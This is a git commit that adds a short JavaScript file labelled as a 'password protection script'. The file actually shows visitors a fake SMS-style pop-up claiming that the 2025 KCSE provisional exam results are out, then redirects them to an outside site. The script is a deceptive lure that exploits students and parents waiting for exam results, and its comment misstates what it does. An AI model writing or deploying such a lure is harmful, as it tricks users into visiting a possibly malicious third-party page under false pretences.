3ed67e24f4c1ba2232f4e97c60cfeecf8c38a151
ukpeha55-stack <ukpeha55@gmail.com>
2026-01-09 01:31:20 +0100

    Create result-active.js

---
+++ result-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'CHECK RESULT'
+password = prompt(
+  'SMS: Congratulations! 2025 KCSE Provisional Results is Out Press Ok to Access your Result now.',
+  'CHECK RESULT'
+);
+if (password != 'CHECK RESULT') {
+  location.href = 'https://ghont.org/result.html';
+}
